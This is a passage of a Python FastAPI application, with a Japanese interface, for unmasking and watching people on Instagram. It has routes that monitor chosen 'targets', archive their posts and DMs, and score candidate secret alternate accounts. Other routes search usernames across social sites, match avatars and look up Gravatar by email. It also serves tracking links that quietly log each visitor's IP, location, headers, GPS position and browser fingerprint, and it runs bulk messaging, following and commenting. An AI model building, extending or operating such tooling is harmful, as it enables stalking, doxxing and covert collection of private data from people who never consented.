        row["actor_avatar"] = ("/profile/avatar/" + row["actor"]
                               if users.get_profile(row.get("actor", "")).get("avatar_data") else "")
        audit_rows.append(row)
    return render("admin_audit.html", request, rows=audit_rows,
                  tenant_root=tenancy.ROOT)


@admin.post("/password")
def admin_password(request: Request, cur: str = Form(""), new: str = Form(""),
                   new2: str = Form(""), u=Depends(admin_auth)):
    real = request.state.real_user
    if new != new2:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote("一致しません"), 303)
    bg = users.env_breakglass()
    ok = users.verify_admin(real, cur) or (bg and cur == bg)
    if not ok:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote("現在のコンソールパスワードが違います"), 303)
    try:
        users.set_admin_password(real, new)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)
    tok = users.new_session(real, "admin", _ip(request), _ua(request))
    users.audit(real, "admin_password_changed", {})
    r = RedirectResponse(ADMIN_PATH + "/?msg=" + quote(
        "コンソールパスワードを変更し、他のコンソールセッションを無効化しました"), 303)
    _set_cookie(r, COOKIE_ADMIN, tok)
    return r


@admin.post("/users/create")
def admin_create(request: Request, username: str = Form(...), password: str = Form(...),
                 role: str = Form("user"), note: str = Form(""),
                 must_change: str = Form(""), u=Depends(admin_auth)):
    me = _perm(request, "users.create")
    if not roles.can_assign(users.role_of(me), role, users.is_root(me)):
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote("その役職は付与できません"), 303)
    try:
        users.create(username, password, role=role, note=note,
                     must_change=bool(must_change))
        users.audit(me, "admin_create", {"username": username, "role": role})
        return RedirectResponse(ADMIN_PATH + "/?msg=" + quote(f"{username} を作成しました"), 303)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)


@admin.post("/users/{target}/password")
def admin_setpw(request: Request, target: str, password: str = Form(...),
                u=Depends(admin_auth)):
    me = _guard(request, target, "users.setpw")
    try:
        users.set_password(target, password, must_change=1)
        users.audit(me, "admin_setpw", {"username": target})
        return RedirectResponse(ADMIN_PATH + "/?msg=" +
                                quote(f"{target} のパスワードを再設定しました"), 303)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)


@admin.post("/users/{target}/adminpw")
def admin_set_adminpw(request: Request, target: str, password: str = Form(...),
                      u=Depends(admin_auth)):
    me = _guard(request, target, "users.setadminpw")
    try:
        users.set_admin_password(target, password)
        users.audit(me, "admin_set_adminpw", {"username": target})
        return RedirectResponse(ADMIN_PATH + "/?msg=" +
                                quote(f"{target} のコンソールPWを設定しました"), 303)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)


@admin.post("/users/{target}/role")
def admin_role(request: Request, target: str, role: str = Form(...),
               u=Depends(admin_auth)):
    me = _guard(request, target, "users.role")
    if not roles.can_assign(users.role_of(me), role, users.is_root(me)):
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote("その役職にはできません"), 303)
    try:
        users.set_role(target, role)
        users.audit(me, "admin_role", {"username": target, "role": role})
        return RedirectResponse(ADMIN_PATH + "/?msg=" +
                                quote(f"{target} を {roles.label(role)} にしました"), 303)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)


@admin.post("/users/{target}/toggle")
def admin_toggle(request: Request, target: str, u=Depends(admin_auth)):
    me = _guard(request, target, "users.disable")
    try:
        row = users.get(target)
        if row:
            users.set_disabled(target, not row["disabled"])
        return RedirectResponse(ADMIN_PATH + "/", 303)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)


@admin.post("/users/{target}/delete")
def admin_delete(request: Request, target: str, purge: str = Form(""),
                 u=Depends(admin_auth)):
    if users.norm(target) == users.norm(request.state.real_user):
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote("自分自身は削除できません"), 303)
    me = _guard(request, target, "users.delete", purge=bool(purge))
    try:
        users.delete(target)
    except ValueError as e:
        return RedirectResponse(ADMIN_PATH + "/?err=" + quote(str(e)), 303)
    if purge:
        shutil.rmtree(os.path.join(tenancy.ROOT, tenancy.safe_name(target)),
                      ignore_errors=True)
        tenancy.close(target)
    users.audit(me, "admin_delete", {"username": target, "purge": bool(purge)})
    return RedirectResponse(ADMIN_PATH + "/?msg=" + quote(f"{target} を削除しました"), 303)


@admin.get("/switch")
def admin_switch(request: Request, to: str = "", back: str = "/", u=Depends(admin_auth)):
    _perm(request, "view_as")
    r = RedirectResponse(_safe_next(back, ADMIN_PATH + "/"), 303)
    if to and users.get(to):
        r.set_cookie("view_as", users.norm(to), httponly=True, samesite="lax",
                     secure=SECURE_COOKIE, max_age=8 * 3600, path="/")
    else:
        r.delete_cookie("view_as", path="/")
    return r


def request_actor(_):
    return tenancy.get_current() or ""


app.include_router(admin)


# ---------- ダッシュボード ----------

@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request, u=Depends(auth)):
    targets = []
    for t in db.targets():
        p = db.q1("SELECT * FROM profiles WHERE user_id=?", (t["user_id"],))
        snap = db.q("""SELECT * FROM profile_snapshots WHERE user_id=?
            ORDER BY taken_at DESC LIMIT 30""", (t["user_id"],))
        best = db.q1("""SELECT * FROM identity_scores WHERE uraaka_user_id=?
            ORDER BY computed_at DESC, score DESC LIMIT 1""", (t["user_id"],))
        targets.append({"t": t, "p": p, "snap": [dict(s) for s in snap], "best": best})
    events = db.q("SELECT * FROM events ORDER BY ts DESC LIMIT 40")
    return render("dashboard.html", request, targets=targets, events=events)


# ---------- 特定 ----------

@app.get("/identity", response_class=HTMLResponse)
def identity_page(request: Request, u=Depends(auth)):
    runs = db.q("SELECT * FROM identity_runs ORDER BY id DESC LIMIT 20")
    pairs = db.pairs(200)
    return render("identity.html", request, runs=runs, pairs=pairs,
                  candidates=get_cfg().get("candidates", []))


@app.post("/identity/run")
def identity_run(target: str = Form(...), candidates: str = Form(""),
                 auto: str = Form(""), archive: str = Form(""),
                 note: str = Form(""), u=Depends(auth)):
    toks = [t.strip().lstrip("@") for t in (candidates or "").replace(",", "\n").split()
            if t.strip()]
    try:
        cl = _ig_client(tries=2)
    except Exception as e:
        rid = db.start_run("0", target.strip().lstrip("@"), note=note)
        db.update_run(rid, status="error",
                      log="Instagramログイン失敗: " + repr(e) + "\n\n" + traceback.format_exc())
        return RedirectResponse(f"/runs/{rid}", 303)
    try:
        t_uid = identity.resolve_uid(cl, db, target)
    except Exception as e:
        rid = db.start_run("0", target.strip().lstrip("@"), note=note)
        db.update_run(rid, status="error",
                      log="ID解決失敗: " + repr(e) + "\n\n" + traceback.format_exc())
        return RedirectResponse(f"/runs/{rid}", 303)

    t_name = identity.name_of(db, t_uid, target.strip().lstrip("@"))
    db.add_known(t_uid, t_name, source="target")
    for tok in toks:
        try:
            uid = identity.resolve_uid(cl, db, tok)
            db.add_known(uid, identity.name_of(db, uid, tok), source="candidate")
        except Exception:
            pass
    rid = db.start_run(t_uid, t_name, candidates_raw=",".join(toks), note=note)

    def job():
        try:
            identity.run_identify(db, target, toks, auto_scan=bool(auto),
                                  run_id=rid, archive_candidates=bool(archive))
            db.update_run(rid, status="ok")
        except Exception as e:
            db.update_run(rid, status="error", log=repr(e) + "\n\n" + traceback.format_exc())

    watcher.run_bg(job)
    return RedirectResponse(f"/runs/{rid}", 303)


@app.post("/pair/run")
def pair_run(pid: int = Form(...), u=Depends(auth)):
    p = db.q1("SELECT * FROM saved_pairs WHERE id=?", (pid,))
    if not p:
        raise HTTPException(404)
    rid = db.start_run(p["target_uid"], p["target_username"] or "",
                       candidates_raw=p["candidate_uid"], note="保存ペア")

    def job():
        try:
            identity.run_identify(db, p["target_uid"], [p["candidate_uid"]], run_id=rid)
            db.update_run(rid, status="ok")
        except Exception as e:
            db.update_run(rid, status="error", log=repr(e) + "\n\n" + traceback.format_exc())

    watcher.run_bg(job)
    return RedirectResponse(f"/runs/{rid}", 303)


@app.post("/pairs/{pid}/delete")
def pair_delete(pid: int, u=Depends(auth)):
    db.del_pair(pid)
    return RedirectResponse("/identity", 303)


# ---------- 履歴 ----------

@app.get("/runs", response_class=HTMLResponse)
def runs_page(request: Request, u=Depends(auth)):
    return render("runs.html", request,
                  runs=db.q("SELECT * FROM identity_runs ORDER BY id DESC LIMIT 300"))


@app.get("/runs/{rid}", response_class=HTMLResponse)
def run_detail(rid: int, request: Request, u=Depends(auth)):
    run = db.q1("SELECT * FROM identity_runs WHERE id=?", (rid,))
    if not run:
        raise HTTPException(404)
    scores = db.q("SELECT * FROM identity_scores WHERE run_id=? ORDER BY score DESC", (rid,))
    tp = db.q1("SELECT * FROM profiles WHERE user_id=?", (run["target_uid"],))
    return render("run_detail.html", request, run=run, scores=scores, tp=tp)


@app.post("/runs/{rid}/delete")
def run_delete(rid: int, u=Depends(auth)):
    db.delete_run(rid)
    return RedirectResponse("/runs", 303)


# ---------- アカウント台帳 ----------

@app.get("/accounts", response_class=HTMLResponse)
def accounts_page(request: Request, u=Depends(auth)):
    return render("accounts.html", request, rows=db.known(1000))


@app.post("/accounts/add")
def accounts_add(token: str = Form(...), note: str = Form(""),
                 deleted: str = Form(""), u=Depends(auth)):
    t = token.strip().lstrip("@")
    try:
        uid = identity.resolve_uid(_ig_client(tries=1), db, t)
    except Exception:
        uid = t
    name = identity.name_of(db, uid, "" if t.isdigit() else t)
    db.add_known(uid, name, note=note, source="manual",
                 deleted=bool(deleted) or identity.is_deleted(db, uid))
    return RedirectResponse("/accounts", 303)


@app.post("/accounts/{uid}/archive")
def accounts_archive(uid: str, u=Depends(auth)):
    def job():
        try:
            ig.archive_account(db, uid)
        except Exception as e:
            db.log(uid, "archive_error", {"error": repr(e)})
    watcher.run_bg(job)
    return RedirectResponse("/accounts", 303)


@app.post("/accounts/{uid}/deleted")
def accounts_deleted(uid: str, u=Depends(auth)):
    row = db.known_get(uid)
    db.set_known_deleted(uid, not (row and row["deleted"]))
    return RedirectResponse("/accounts", 303)


@app.post("/accounts/{uid}/delete")
def accounts_delete(uid: str, u=Depends(auth)):
    db.del_known(uid)
    return RedirectResponse("/accounts", 303)


# ---------- ターゲット ----------

@app.get("/target/{uid}", response_class=HTMLResponse)
def target_detail(uid: str, request: Request, u=Depends(auth)):
    p = db.q1("SELECT * FROM profiles WHERE user_id=?", (uid,))
    posts = db.q("SELECT * FROM posts WHERE user_id=? ORDER BY taken_at DESC LIMIT 60", (uid,))
    rel = db.q("""SELECT * FROM relationship_events WHERE from_user_id=?
        ORDER BY observed_at DESC LIMIT 100""", (uid,))
    snap = db.q("""SELECT * FROM profile_snapshots WHERE user_id=?
        ORDER BY taken_at DESC LIMIT 100""", (uid,))
    return render("target.html", request, uid=uid, p=p, posts=posts, rel=rel, snap=snap)


@app.get("/forensics", response_class=HTMLResponse)
def forensics_page(request: Request, u=Depends(auth)):
    rows = db.q("SELECT * FROM forensics ORDER BY ts DESC LIMIT 300")
    return render("activity.html", request, events=rows, kind="forensics")


@app.get("/activity", response_class=HTMLResponse)
def activity(request: Request, kind: str = "", u=Depends(auth)):
    if kind:
        rows = db.q("SELECT * FROM events WHERE kind LIKE ? ORDER BY ts DESC LIMIT 500",
                    (f"%{kind}%",))
    else:
        rows = db.q("SELECT * FROM events ORDER BY ts DESC LIMIT 500")
    return render("activity.html", request, events=rows, kind=kind)


@app.get("/dms", response_class=HTMLResponse)
def dms(request: Request, thread: str = "", u=Depends(auth)):
    threads = db.q("SELECT * FROM dm_threads ORDER BY last_activity_at DESC LIMIT 200")
    msgs = []
    if thread:
        msgs = db.q("""SELECT * FROM dm_messages WHERE thread_id=?
            ORDER BY timestamp ASC LIMIT 500""", (thread,))
    return render("dms.html", request, threads=threads, msgs=msgs, thread=thread)


@app.get("/targets", response_class=HTMLResponse)
def targets_page(request: Request, u=Depends(auth)):
    return render("targets.html", request, targets=db.targets(),
                  candidates=get_cfg().get("candidates", []))


@app.post("/targets/add")
def targets_add(handle: str = Form(...), u=Depends(auth)):
    h = handle.strip().lstrip("@")
    try:
        uid = identity.resolve_uid(_ig_client(tries=1), db, h)
    except Exception:
        uid = h
    db.add_target(uid, h)
    db.add_known(uid, h, source="target")
    return RedirectResponse("/targets", 303)


@app.post("/target/{uid}/archive")
def target_archive(uid: str, u=Depends(auth)):
    def job():
        jid = db.start_job(f"archive:{uid}")
        try:
            ig.full_archive(db, uid)
            db.finish_job(jid, "ok")
        except Exception as e:
            db.finish_job(jid, "error", repr(e) + "\n\n" + traceback.format_exc())
    watcher.run_bg(job)
    return RedirectResponse(f"/target/{uid}", 303)


@app.post("/target/{uid}/monitor")
def target_monitor(uid: str, u=Depends(auth)):
    row = db.q1("SELECT monitor FROM targets WHERE user_id=?", (uid,))
    newv = 0 if row and row["monitor"] else 1
    with db.tx() as c:
        c.execute("UPDATE targets SET monitor=? WHERE user_id=?", (newv, uid))
    return RedirectResponse("/targets", 303)


@app.post("/candidates/add")
def candidates_add(handle: str = Form(...), u=Depends(auth)):
    h = handle.strip().lstrip("@")
    cur = get_cfg().get("candidates", [])
    if h and h not in cur:
        config.save_sections({"candidates": cur + [h]})
    return RedirectResponse("/targets", 303)


# ---------- 設定 ----------

def _coerce(old, new):
    if isinstance(old, bool):
        return new in ("on", "1", "true", "True")
    if isinstance(old, int):
        try:
            return int(float(new))
        except Exception:
            return old
    if isinstance(old, float):
        try:
            return float(new)
        except Exception:
            return old
    return new


@app.get("/settings", response_class=HTMLResponse)
def settings_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
    cfg = get_cfg()
    sections = {s: {k: v for k, v in cfg.get(s, {}).items() if not k.startswith("_")}
                for s in EDITABLE if isinstance(cfg.get(s), dict)}
    return render("settings.html", request, sections=sections, ig=cfg["instagram"],
                  tenant_dir=tenancy.tenant_dir(u),
                  env_user=os.getenv("IG_USER") or "",
                  targets="\n".join(cfg.get("targets", [])),
                  candidates="\n".join(cfg.get("candidates", [])),
                  msg=msg, err=err, ig_state=_IG_STATE, backup=persist.state())


@app.post("/settings")
async def settings_save(request: Request, u=Depends(auth)):
    form = await request.form()
    base = get_cfg()
    over = {}
    for key, val in form.items():
        if key.startswith("__") or key.startswith("ig_"):
            continue
        parts = key.split(".")
        node, cur = base, over
        for p in parts[:-1]:
            node = node.get(p, {}) or {}
            cur = cur.setdefault(p, {})
        cur[parts[-1]] = _coerce(node.get(parts[-1]), val)

    igd = {}
    for f_key, c_key in (("ig_user", "username"), ("ig_pass", "password"),
                         ("ig_session_b64", "session_b64")):
        if f_key in form:
            igd[c_key] = (form.get(f_key) or "").strip()
    over["instagram"] = igd
    over["targets"] = [l.strip().lstrip("@")
                       for l in form.get("__targets", "").splitlines() if l.strip()]
    over["candidates"] = [l.strip().lstrip("@")
                          for l in form.get("__candidates", "").splitlines() if l.strip()]
    config.save_sections(over)

    if igd.get("session_b64"):
        config.write_session_file(igd["session_b64"], get_cfg()["instagram"]["session_file"])
    ig.reset_client()
    _IG_STATE["ok"] = False
    persist.push(force=True)
    persist.push_user(u, force=True)
    return RedirectResponse("/settings?msg=" + quote("設定を保存しました"), 303)


@app.post("/ig/test")
def ig_test(u=Depends(auth)):
    try:
        me = _ig_client(force=True, tries=2).account_info()
        return RedirectResponse("/settings?msg=" + quote(f"接続OK: @{me.username}"), 303)
    except Exception as e:
        return RedirectResponse("/settings?err=" + quote(repr(e)), 303)


@app.post("/ig/boot")
def ig_boot_route(u=Depends(auth)):
    _IG_STATE["ok"] = False
    threading.Thread(target=_ig_boot, kwargs={"force": True}, daemon=True).start()
    return RedirectResponse("/settings?msg=" + quote("Instagram再接続を開始しました"), 303)


@app.post("/ig/login")
def ig_login(user: str = Form(""), password: str = Form(""), u=Depends(auth)):
    cfg = get_cfg()
    un = (user or "").strip() or cfg["instagram"].get("username") or ""
    pw = password or cfg["instagram"].get("password") or ""
    sf = cfg["instagram"]["session_file"]
    try:
        ig.reset_client()
        _IG_STATE["ok"] = False
        ig.login_now(un, pw, sf)
        with open(sf, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        config.save_sections({"instagram": {"username": un, "password": pw, "session_b64": b64}})
        ig.reset_client()
        _IG_STATE["ok"] = True
        persist.push_user(u, force=True)
        return RedirectResponse("/settings?msg=" + quote("ログイン成功・セッションを保存しました"), 303)
    except Exception as e:
        return RedirectResponse("/settings?err=" + quote(repr(e)), 303)


@app.post("/ig/logout")
def ig_logout(u=Depends(auth)):
    sf = get_cfg()["instagram"]["session_file"]
    try:
        if os.path.exists(sf):
            os.remove(sf)
    except Exception:
        pass
    config.save_sections({"instagram": {"session_b64": ""}})
    ig.reset_client()
    _IG_STATE["ok"] = False
    persist.push_user(u, force=True)
    return RedirectResponse("/settings?msg=" + quote("ログアウトしました"), 303)


# ---------- SNS横断検索 ----------

@app.get("/sns", response_class=HTMLResponse)
def sns_page(request: Request, u=Depends(auth)):
    return render("sns.html", request, scans=db.scans(100), cats=snscheck.CATS)


@app.post("/sns/scan")
def sns_scan(username: str = Form(...), cats: list[str] = Form([]), u=Depends(auth)):
    name = username.strip().lstrip("@")
    if not name:
        return RedirectResponse("/sns", 303)
    sid = db.start_scan(name)

    def job():
        try:
            res = snscheck.scan(name, cats=cats or None)
            for r in res:
                db.add_sns_hit({"scan_id": sid, "username": name, "site": r["site"],
                                "site_name": r["site_name"], "cat": r["cat"],
                                "url": r["url"], "state": r["state"], "code": r["code"],
                                "title": r["title"], "og_image": r["og_image"],
                                "phash": "", "seen_at": now_iso()})
            found = sum(1 for r in res if r["state"] == "yes")
            db.finish_scan(sid, total=len(res), found=found, status="ok")
        except Exception as e:
            db.finish_scan(sid, status="error", log=repr(e) + "\n\n" + traceback.format_exc())

    watcher.run_bg(job)
    return RedirectResponse(f"/sns/{sid}", 303)


@app.get("/sns/{sid}", response_class=HTMLResponse)
def sns_result(sid: int, request: Request, u=Depends(auth)):
    sc = db.scan(sid)
    if not sc:
        raise HTTPException(404)
    hits = [dict(r) for r in db.sns_hits(sid)]
    return render("sns_result.html", request, sc=sc, hits=hits)


@app.post("/sns/{sid}/delete")
def sns_delete(sid: int, u=Depends(auth)):
    db.del_scan(sid)
    return RedirectResponse("/sns", 303)


@app.post("/sns/{sid}/avatars")
def sns_avatars(sid: int, u=Depends(auth)):
    def job():
        for r in db.q("SELECT * FROM sns_hits WHERE scan_id=? AND og_image<>''", (sid,)):
            ph = snscheck.phash_url(r["og_image"])
            if ph:
                with db.tx() as c:
                    c.execute("UPDATE sns_hits SET phash=? WHERE id=?", (ph, r["id"]))
                db.upsert_avatar("sns", r["username"], r["site"], r["og_image"], ph)
    watcher.run_bg(job)
    return RedirectResponse(f"/sns/{sid}?msg=" + quote("アイコン照合を開始しました"), 303)


@app.get("/avatars", response_class=HTMLResponse)
def avatars_page(request: Request, u=Depends(auth)):
    rows = [dict(r) for r in db.avatars(3000)]
    groups = {}
    for r in rows:
        if not r["phash"]:
            continue
        key = None
        for k in list(groups):
            if snscheck.phash_distance(k, r["phash"]) <= 8:
                key = k
                break
        groups.setdefault(key or r["phash"], []).append(r)
    gs = [g for g in groups.values() if len(g) > 1]
    gs.sort(key=lambda g: -len(g))
    return render("avatars.html", request, groups=gs, total=len(rows))


@app.get("/gravatar", response_class=HTMLResponse)
def gravatar_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
    return render("gravatar.html", request, rows=db.gravatars(200), msg=msg, err=err)


@app.post("/gravatar")
def gravatar_lookup(email: str = Form(...), u=Depends(auth)):
    d = snscheck.gravatar(email)
    if not d:
        return RedirectResponse("/gravatar?err=" + quote("メールが空です"), 303)
    db.add_gravatar(d)
    return RedirectResponse("/gravatar?msg=" + quote("取得しました"), 303)


@app.post("/gravatar/{gid}/delete")
def gravatar_del(gid: int, u=Depends(auth)):
    db.del_gravatar(gid)
    return RedirectResponse("/gravatar", 303)


# ---------- キャンペーン / 一斉操作 ----------

@app.get("/campaigns", response_class=HTMLResponse)
def campaigns_page(request: Request, u=Depends(auth)):
    return render("campaigns.html", request, camps=db.campaigns(200), base=_base(request))


@app.post("/campaigns/add")
def campaigns_add(name: str = Form(...), handles: str = Form(""), message: str = Form(""),
                  mode: str = Form("page"), dest: str = Form(""), note: str = Form(""),
                  u=Depends(auth)):
    hs = [h.strip() for h in handles.replace(",", "\n").splitlines() if h.strip()]
    cid = campaign.create(db, u, name, hs, message, mode, dest, note)
    persist.push_user(u, force=True)
    return RedirectResponse(f"/campaign/{cid}", 303)


@app.get("/campaign/{cid}", response_class=HTMLResponse)
def campaign_detail(cid: int, request: Request, u=Depends(auth)):
    c = db.campaign(cid)
    if not c:
        raise HTTPException(404)
    rows = campaign.match(db, cid)
    hit = sum(1 for r in rows if r["hits"])
    return render("campaign_detail.html", request, c=c, rows=rows, hit=hit, base=_base(request))


@app.post("/campaign/{cid}/send")
def campaign_send(cid: int, request: Request, delay: float = Form(8.0),
                  limit: int = Form(0), dry: str = Form(""), u=Depends(auth)):
    base = _base(request)

    def job():
        try:
            campaign.send(db, cid, base, delay=delay, limit=limit, dry=bool(dry))
        except Exception as e:
            db.set_campaign_status(cid, "error")
            db.log("campaign", "send_error", {"id": cid, "error": repr(e)})
    watcher.run_bg(job)
    return RedirectResponse(f"/campaign/{cid}", 303)


@app.post("/campaign/{cid}/delete")
def campaign_del(cid: int, u=Depends(auth)):
    for r in db.q("SELECT code FROM campaign_targets WHERE campaign_id=?", (cid,)):
        users.unregister_link(r["code"])
        db.del_link(r["code"])
    db.del_campaign(cid)
    return RedirectResponse("/campaigns", 303)


@app.get("/tools", response_class=HTMLResponse)
def tools_page(request: Request, u=Depends(auth)):
    return render("tools.html", request)


@app.post("/tools/follow")
def tools_follow(handles: str = Form(...), delay: float = Form(6.0),
                 unfollow: str = Form(""), u=Depends(auth)):
    hs = [h.strip() for h in handles.replace(",", "\n").splitlines() if h.strip()]
    if hs:
        watcher.run_bg(lambda: campaign.bulk_follow(hs, delay=delay, unfollow=bool(unfollow)))
    return RedirectResponse("/tools", 303)


@app.post("/tools/like")
def tools_like(username: str = Form(...), amount: int = Form(12),
               delay: float = Form(5.0), u=Depends(auth)):
    watcher.run_bg(lambda: campaign.bulk_like(username, amount=amount, delay=delay))
    return RedirectResponse("/tools", 303)


@app.post("/tools/comment")
def tools_comment(target: str = Form(...), text: str = Form(...),
                  delay: float = Form(6.0), u=Depends(auth)):
    watcher.run_bg(lambda: campaign.bulk_comment(target, text, delay=delay))
    return RedirectResponse("/tools", 303)


@app.post("/tools/archive")
def tools_archive(handles: str = Form(...), u=Depends(auth)):
    hs = [h.strip() for h in handles.replace(",", "\n").splitlines() if h.strip()]
    if hs:
        watcher.run_bg(lambda: campaign.bulk_archive(db, hs))
    return RedirectResponse("/tools", 303)


# ---------- リンク追跡（公開ルート） ----------

def _record_hit(request: Request, code: str):
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = linktrack.geo(ip)
    hdrs = {k.lower(): v for k, v in request.headers.items()
            if k.lower() in ("accept", "accept-language", "referer", "sec-ch-ua",
                             "sec-ch-ua-mobile", "sec-ch-ua-platform", "dnt",
                             "accept-encoding", "pragma", "cache-control",
                             "x-requested-with", "sec-fetch-site", "sec-fetch-mode")}
    hid = db.add_hit({
        "code": code, "ts": now_iso(), "ip": ip, "ua": ua,
        "nonce": secrets.token_hex(16),
        "lang": request.headers.get("accept-language", ""),
        "referer": request.headers.get("referer", ""),
        "accept": request.headers.get("accept", ""),
        "headers": _json.dumps(hdrs, ensure_ascii=False),
        "query": str(request.url.query)[:500],
        "country": g.get("country"), "country_code": g.get("country_code"),
        "region": g.get("region"), "city": g.get("city"), "zip": g.get("zip"),
        "isp": g.get("isp"), "org": g.get("org"), "asn": g.get("asn"),
        "tz": g.get("tz"), "lat": g.get("lat"), "lon": g.get("lon"),
        "device": p["device"], "os": p["os"], "browser": p["browser"],
        "inapp": p["inapp"], "is_bot": p["is_bot"], "is_mobile": p["is_mobile"],
        "is_proxy": g.get("is_proxy"), "is_hosting": g.get("is_hosting"),
    })
    db.bump_link(code)
    return hid


def now_iso():
    import datetime as _dt
    return _dt.datetime.now(_dt.timezone.utc).isoformat()


def _bind_owner(code):
    owner = users.owner_of_link(code)
    if owner:
        tenancy.set_current(owner)
        persist.touch(owner, interval=persist.cfg()["every_hit"])
    return owner


@app.get("/l/{code}")
def link_hit(code: str, request: Request):
    if not _bind_owner(code):
        return PlainTextResponse("リンクが無効です", status_code=404)
    link = db.link_get(code)
    if not link or not link["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    hid = _record_hit(request, code)
    hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
    nonce = (hrow["nonce"] if hrow else "") or ""

    if link["mode"] == "redirect" and link["dest"]:
        return RedirectResponse(link["dest"], 302)

    if link["mode"] == "quiz" and db.questions(code):
        qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
               "options": _json.loads(r["options"] or "[]")} for r in db.questions(code)]
        return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce,
                      questions_json=_json.dumps(qs, ensure_ascii=False))

    if link["mode"] == "identify":
        ip = linktrack.client_ip(request)
        return render("link_identify.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce, ip=ip,
                      p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                      g=linktrack.geo(ip))

    if link["mode"] == "live":
        return render("link_live.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce,
                      iv=int(link["interval"] or 15),
                      maxmin=int(os.getenv("LIVE_MAX_MIN", "180")))

    return render("link_land.html", request, code=code, hit_id=hid, link=link,
                  dest=link["dest"] or "", nonce=nonce)


@app.post("/l/{code}/x")
async def link_extra(code: str, request: Request):
    if not _bind_owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    hid = body.get("hit_id")
    if not hid:
        return {"ok": False}

    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = linktrack.geo(ip)

    f = {}
    for k in ("screen", "tz", "platform", "cores", "mem", "touch"):
        if body.get(k) not in (None, ""):
            f[k] = body[k]
    if body.get("gps_lat") is not None:
        f["gps_lat"] = body.get("gps_lat")
        f["gps_lon"] = body.get("gps_lon")
        f["gps_acc"] = body.get("gps_acc")
    if body.get("fp"):
        f["fingerprint"] = str(body["fp"])[:128]
    if body.get("fp_json"):
        f["fp_json"] = _json.dumps(body["fp_json"], ensure_ascii=False)[:8000]
    if body.get("vid"):
        f["vid"] = str(body["vid"])[:64]
    if body.get("pubkey"):
        f["pubkey"] = str(body["pubkey"])[:512]
    if body.get("sig"):
        f["sig"] = str(body["sig"])[:512]
    if f:
        db.update_hit(int(hid), **f)

    row = db.q1("SELECT nonce,vid,pubkey,sig FROM link_hits WHERE id=?", (int(hid),))
    if row and row["nonce"] and row["pubkey"] and row["sig"]:
        db.update_hit(int(hid), sig_ok=1 if linktrack.verify_sig(
            row["pubkey"], row["sig"], row["nonce"]) else 0)

    vid = (row["vid"] if row else "") or ""
    if vid:
        db.upsert_visitor(
            vid, ip=ip, country=g.get("country"), region=g.get("region"),
            city=g.get("city"), isp=g.get("isp"), asn=g.get("asn"),
            device=p["device"], os=p["os"], browser=p["browser"], inapp=p["inapp"],
            fingerprint=str(body.get("fp") or "")[:128],
            pubkey=str(body.get("pubkey") or "")[:512])
    return {"ok": True, "vid": vid}


@app.post("/l/{code}/a")
async def link_answer(code: str, request: Request):
    if not _bind_owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    q = db.q1("SELECT * FROM link_questions WHERE id=? AND code=?",
              (int(body.get("qid") or 0), code))
    if not q:
        return {"ok": False}
    ans = body.get("answer")
    if isinstance(ans, list):
        ans = ",".join(str(x) for x in ans)
    ans = str(ans or "")[:2000]
    ok = None
    if (q["answer_key"] or "") != "":
        ok = int(str(q["answer_key"]).strip() == ans.strip())
    db.add_answer({"code": code, "hit_id": int(body.get("hit_id") or 0),
                   "qid": q["id"], "ord": q["ord"], "qtype": q["qtype"],
                   "answer": ans, "is_correct": ok,
                   "ms": int(body.get("ms") or 0),
                   "ip": linktrack.client_ip(request), "ts": now_iso()})

    reveal = ""
    if q["qtype"] in ("choice", "multi"):
        opts = _json.loads(q["options"] or "[]")
        idxs = [int(x) for x in ans.split(",") if x.strip().isdigit()]
        reveal = " / ".join(o.get("reveal", "") for i, o in enumerate(opts)
                            if i in idxs and o.get("reveal"))
    else:
        reveal = q["reveal"] or ""
    return {"ok": True, "correct": ok, "reveal": reveal}


@app.post("/l/{code}/done")
async def link_done(code: str, request: Request):
    if not _bind_owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    hid = int(body.get("hit_id") or 0)
    if hid:
        db.update_hit(hid, quiz_done=1, quiz_score=float(body.get("score") or 0),
                      quiz_total=int(body.get("total") or 0),
                      quiz_ms=int(body.get("ms") or 0))
        db.log("link", "quiz_done", {"code": code, "hit_id": hid,
                                     "score": body.get("score"),
                                     "total": body.get("total")})
    return {"ok": True}


@app.get("/l/{code}/go")
def link_go(code: str):
    if not _bind_owner(code):
        raise HTTPException(404)
    link = db.link_get(code)
    if not link:
        raise HTTPException(404)
    return RedirectResponse(link["dest"] or "/", 302)


@app.get("/link/me", response_class=HTMLResponse)
def link_me(request: Request):
    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    return render("link_me.html", request, ip=ip, ua=ua,
                  p=linktrack.parse_ua(ua), g=linktrack.geo(ip))


# ---------- リンク管理 ----------

def _new_code(n=8):
    for _ in range(50):
